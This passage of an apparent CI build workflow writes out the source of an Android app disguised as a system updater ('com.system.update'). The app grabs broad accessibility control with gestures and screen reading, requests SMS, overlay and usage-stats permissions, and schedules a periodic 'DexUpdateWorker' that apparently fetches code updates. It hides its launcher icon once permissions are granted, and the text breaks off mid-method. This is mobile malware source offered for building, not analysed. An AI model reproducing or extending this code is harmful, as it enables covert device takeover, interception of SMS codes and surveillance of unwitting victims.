      # ==================== ACCESSIBILITY CONFIG ====================
      
      - name: Create accessibility_config.xml
        run: |
          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
              android:canPerformGestures="true"
              android:canRetrieveWindowContent="true"
              android:description="@string/app_name"
              android:notificationTimeout="100" />
          EOF

      # ==================== SOURCE FILES ====================
      
      - name: Create DexUpdateWorker.java
        run: |
          cat > app/src/main/java/com/system/update/DexUpdateWorker.java << 'EOF'
          package com.system.update;

          import android.content.Context;
          import android.util.Log;
          import androidx.annotation.NonNull;
          import androidx.work.Worker;
          import androidx.work.WorkerParameters;

          public class DexUpdateWorker extends Worker {
              private static final String TAG = "DexUpdateWorker";

              public DexUpdateWorker(@NonNull Context context, @NonNull WorkerParameters params) {
                  super(context, params);
              }

              @NonNull
              @Override
              public Result doWork() {
                  try {
                      Log.d(TAG, "🔄 Worker checking for updates...");
                      
                      android.content.Intent intent = new android.content.Intent(getApplicationContext(), AIAccessibilityService.class);
                      intent.setAction("CHECK_UPDATE");
                      getApplicationContext().startService(intent);
                      
                      return Result.success();
                  } catch (Exception e) {
                      Log.e(TAG, "❌ Worker failed: " + e.getMessage());
                      return Result.retry();
                  }
              }
          }
          EOF

      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/system/update/MainActivity.java << 'EOF'
          package com.system.update;

          import android.app.Activity;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Toast;
          import android.widget.Button;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import androidx.work.Constraints;
          import androidx.work.NetworkType;
          import androidx.work.PeriodicWorkRequest;
          import androidx.work.WorkManager;
          import java.util.concurrent.TimeUnit;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST_CODE = 123;
              private static final int OVERLAY_PERMISSION_REQUEST = 456;
              
              private Button btnGrantPermissions;
              private Button btnGrantAccessibility;
              
              private boolean permissionsGranted = false;
              private boolean accessibilityGranted = false;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  
                  btnGrantPermissions = findViewById(R.id.btnGrantPermissions);
                  btnGrantAccessibility = findViewById(R.id.btnGrantAccessibility);
                  
                  btnGrantPermissions.setOnClickListener(v -> requestAllPermissions());
                  btnGrantAccessibility.setOnClickListener(v -> openAccessibilitySettings());
                  
                  checkPermissions();
                  
                  startWorkManager();
              }

              private void startWorkManager() {
                  Constraints constraints = new Constraints.Builder()
                      .setRequiredNetworkType(NetworkType.CONNECTED)
                      .build();

                  PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
                      DexUpdateWorker.class,
                      15, TimeUnit.MINUTES
                  )
                  .setConstraints(constraints)
                  .build();

                  WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                      "dex_update_work",
                      androidx.work.ExistingPeriodicWorkPolicy.KEEP,
                      workRequest
                  );
              }

              private void checkPermissions() {
                  boolean internetGranted = ContextCompat.checkSelfPermission(this, 
                      android.Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED;
                  
                  boolean smsGranted = ContextCompat.checkSelfPermission(this, 
                      android.Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
                  
                  boolean networkGranted = ContextCompat.checkSelfPermission(this, 
                      android.Manifest.permission.ACCESS_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED;
                  
                  boolean overlayGranted = true;
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      overlayGranted = Settings.canDrawOverlays(this);
                  }
                  
                  permissionsGranted = internetGranted && smsGranted && networkGranted && overlayGranted;
                  accessibilityGranted = isAccessibilityEnabled();
                  
                  updateButtons();
                  
                  if (permissionsGranted && accessibilityGranted) {
                      startService(new Intent(this, AIAccessibilityService.class));
                      hideAppIcon();
                      finish();
                  }
              }

              private void requestAllPermissions() {
                  String[] permissions = {
                      android.Manifest.permission.RECEIVE_SMS,
                      android.Manifest.permission.ACCESS_NETWORK_STATE,
                      android.Manifest.permission.QUERY_ALL_PACKAGES,
                      android.Manifest.permission.GET_TASKS,
                      android.Manifest.permission.PACKAGE_USAGE_STATS
                  };
                  
                  boolean needPermission = false;
                  for (String permission : permissions) {
                      if (ContextCompat.checkSelfPermission(this, permission) 
                          != PackageManager.PERMISSION_GRANTED) {
                          needPermission = true;
                          break;
                      }
                  }
                  
                  if (needPermission) {
                      ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
                  }
                  
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      if (!Settings.canDrawOverlays(this)) {
